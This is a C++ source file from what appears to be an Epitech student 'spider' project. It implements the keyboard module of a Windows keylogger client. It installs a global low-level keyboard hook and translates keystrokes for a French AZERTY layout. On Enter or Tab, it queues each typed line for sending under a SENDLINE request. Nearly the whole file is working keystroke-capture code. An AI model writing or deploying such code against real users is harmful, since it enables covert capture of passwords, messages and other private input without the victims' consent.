/*
** Keyboard.cpp for Client in /Users/gmblucas/Desktop/Shared/Epitech/cpp_spider/Client/Sources/Modules
**
** Made by Lucas Gambini
** Login   <gmblucas@epitech.net>
**
** Started on  Wed Sep 27 19:41:55 2017 Lucas Gambini
** Last update Fri Sep 29 16:31:21 2017 Lucas Gambini
*/

#include "Keyboard.hpp"
#include <algorithm>
#include <string>
// #include <local>

Keyboard *Keyboard::_Static;

Keyboard::Keyboard(std::deque<std::pair<Request, std::string>> &sendingQueue) : _sendingQueue(sendingQueue) {
	Keyboard::_Static = this;
	this->_display = true;
}

Keyboard::~Keyboard() {
}

Keyboard &Keyboard::operator=(const Keyboard &obj) {
	this->_status = obj._status;
	this->_sendingQueue = obj._sendingQueue;
	return (*this);
}

Keyboard::Keyboard(const Keyboard &obj) : _sendingQueue(obj._sendingQueue) {
	this->_status = obj._status;
	this->_display = obj._display;
}

LRESULT CALLBACK LowLevelKeyboardProcStatic(int nCode, WPARAM wParam, LPARAM lParam)
{
	return(Keyboard::_Static->LowLevelKeyboardProc(nCode, wParam, lParam));
}

LRESULT CALLBACK Keyboard::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	int key = 0;
	KBDLLHOOKSTRUCT*	AboutKeyboard = (KBDLLHOOKSTRUCT*)lParam;
	std::pair<bool, std::string> data;
	key = (int)AboutKeyboard->vkCode;
	if (wParam == WM_KEYDOWN)
	{
		if (key >= 'A' && key <= 'Z') {
			key += 32;
		}
		if ((GetKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL)) || ((GetKeyState(161) & 0x8000))) {
			if (key != 160 && key != 20 && key != 161) {
				if (key >= 'a' && key <= 'z')
					key -= 32;
				data = this->manageShityKey(key, true);
				if (data.first == true)
					this->_stringLine += data.second;
				else
					this->_stringLine += (char)key;
			}
		}
		else
		{
			if (key != 160 && key != 20 && key != 162) {
				if (key >= '0' && key <= '9') {
					data = this->manageNum(key);
					this->_stringLine += data.second;
				}
				else {
					data = this->manageShityKey(key, false);
					if (data.first == true)
						this->_stringLine += data.second;
					else {
						if (key == VK_RETURN || key == VK_TAB) {
							this->_sendingQueue.push_front(std::make_pair(Request::SENDLINE, this->_stringLine));
							this->_stringLine = "";
						}
						if ((GetKeyState(VK_CONTROL)) && (GetKeyState(VK_MENU))) {
							this->_stringLine += (char)key;
						}
						else if (key != VK_RETURN && key != 161) {
							if (key == '\b') {
								if (!this->_stringLine.empty())
									this->_stringLine.pop_back();
							}
							else
								this->_stringLine += (char)key;
						}
					}
				}
			}
		}
	}
	else if (WM_KEYUP) {
		if ((GetKeyState(VK_CONTROL)) && (GetKeyState(VK_MENU))) {
			data = this->manageAltGr(key);
			if (data.first == true && this->_display == true) {
				this->_display = !this->_display;
				this->_stringLine += data.second;
			}
			else if (this->_display == false) {
				this->_display = true;
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Keyboard::update() {
	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProcStatic, 0, 0);
	char key = 0;
	MSG	msg;
	std::pair<bool, std::string> data;
	std::string info;
	while (!GetMessage(&msg, NULL, NULL, NULL) && this->_status == RUNNING) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hhkLowLevelKybd);
}

void Keyboard::setup() {
	this->_status = RUNNING;
	this->_thread = std::thread(&Keyboard::update, this);
}

std::pair<bool, std::string> const Keyboard::manageShityKey(int key, bool isShiftPressed) {
	if (isShiftPressed == true) {
		switch (key)
		{
		case 188:
			return std::make_pair(true, "?");
		case 190:
			return std::make_pair(true, ".");
		case 191:
			return std::make_pair(true, "/");
		case 223:
			return std::make_pair(true, "§");
		case 221:
			return std::make_pair(true, "¨");
		case 186:
			return std::make_pair(true, "£");
		case 192:
			return std::make_pair(true, "%");
		case 220:
			return std::make_pair(true, "µ");
		case 187:
			return std::make_pair(true, "+");
		case 219:
			return std::make_pair(true, "°");
		case 222:
			return std::make_pair(true, "");
		case 226:
			return std::make_pair(true, ">");
		case VK_LEFT:
			return std::make_pair(true, " *LEFT* ");
		case VK_RIGHT:
			return std::make_pair(true, " *RIGHT* ");
		case VK_UP:
			return std::make_pair(true, " *UP* ");
		case VK_DOWN:
			return std::make_pair(true, " *DOWN* ");
		default:
			return std::make_pair(false, "");
		}
	}
	else {
		switch (key)
		{
		case 188:
			return std::make_pair(true, ",");
		case 190:
			return std::make_pair(true, ";");
		case 191:
			return std::make_pair(true, ":");
		case 223:
			return std::make_pair(true, "!");
		case 221:
			return std::make_pair(true, "^");
		case 186:
			return std::make_pair(true, "$");
		case 192:
			return std::make_pair(true, "ù");
		case 220:
			return std::make_pair(true, "*");
		case 187:
			return std::make_pair(true, "=");
		case 219:
			return std::make_pair(true, ")");
		case 222:
			return std::make_pair(true, "²");
		case 226:
			return std::make_pair(true, "<");
		case VK_LEFT:
			return std::make_pair(true, " *LEFT* ");
		case VK_RIGHT:
			return std::make_pair(true, " *RIGHT* ");
		case VK_UP:
			return std::make_pair(true, " *UP* ");
		case VK_DOWN:
			return std::make_pair(true, " *DOWN* ");
		default:
			return std::make_pair(false, "");
		}
	}
	return std::make_pair(false, "");
}

std::pair<bool, std::string> const Keyboard::manageAltGr(int key) {
	switch (key)
	{
	case 50:
		return std::make_pair(true, "~");
	case 51:
		return std::make_pair(true, "#");
	case 52:
		return std::make_pair(true, "{");
	case 53:
		return std::make_pair(true, "[");
	case 54:
		return std::make_pair(true, "|");
	case 55:
		return std::make_pair(true, "`");
	case 56:
		return std::make_pair(true, "\\");
	case 57:
		return std::make_pair(true, "^");
	case 48:
		return std::make_pair(true, "@");
	case 187:
		return std::make_pair(true, "}");
	case 219:
		return std::make_pair(true, "]");
	default:
		return std::make_pair(false, "");
	}
}

std::pair<bool, std::string> const Keyboard::manageNum(int key) {
	switch (key)
	{
	case 49:
		return std::make_pair(true, "&");
	case 50:
		return std::make_pair(true, "é");
	case 51:
		return std::make_pair(true, "\"");
	case 52:
		return std::make_pair(true, "'");
	case 53:
		return std::make_pair(true, "(");
	case 54:
		return std::make_pair(true, "-");
	case 55:
		return std::make_pair(true, "è");
	case 56:
		return std::make_pair(true, "_");
	case 57:
		return std::make_pair(true, "ç");
	case 48:
		return std::make_pair(true, "à");
	default:
		return std::make_pair(false, "");
	}
}

std::pair<bool, std::string> const Keyboard::manageSpecialKey(int key) {
	switch (key)
	{
	case VK_RETURN: {
		this->_sendingQueue.push_front(std::make_pair(Request::SENDLINE, this->_stringLine));
		this->_stringLine = "";
		return std::make_pair(true, "");
	}
	case VK_BACK:
		return std::make_pair(true, "\b");
	case VK_LEFT:
		return std::make_pair(true, " *LEFT* ");
	case VK_RIGHT:
		return std::make_pair(true, " *RIGHT* ");
	case VK_UP:
		return std::make_pair(true, " *UP* ");
	case VK_DOWN:
		return std::make_pair(true, " *DOWN* ");
	case VK_TAB: {
		this->_sendingQueue.push_front(std::make_pair(Request::SENDLINE, this->_stringLine));
		this->_stringLine = "";
		return std::make_pair(true, "");
	}
	case VK_SPACE:
		return std::make_pair(true, " ");
	case VK_OEM_1:
		return std::make_pair(true, ";");
	case VK_OEM_PLUS:
		return std::make_pair(true, "+");
	case VK_OEM_COMMA:
		return std::make_pair(true, ",");
	case VK_OEM_PERIOD:
		return std::make_pair(true, ".");
	case VK_OEM_2:
		return std::make_pair(true, "?");
	case VK_OEM_3:
		return std::make_pair(true, "~");
	case 49:
		return std::make_pair(true, "&");
	case 50:
		return std::make_pair(true, "é");
	case 51:
		return std::make_pair(true, "\"");
	case 52:
		return std::make_pair(true, "'");
	case 53:
		return std::make_pair(true, "(");
	case 54:
		return std::make_pair(true, "-");
	case 55:
		return std::make_pair(true, "è");
	case 56:
		return std::make_pair(true, "_");
	case 57:
		return std::make_pair(true, "ç");
	case 48:
		return std::make_pair(true, "à");
	case 160:
		return std::make_pair(false, "");
	case 162:
		return std::make_pair(true, " *CTRL* ");
	case 219:
		return std::make_pair(true, ")");
	case 220:
		return std::make_pair(true, "*");
	default:
		return std::make_pair(false, "");
	}
}
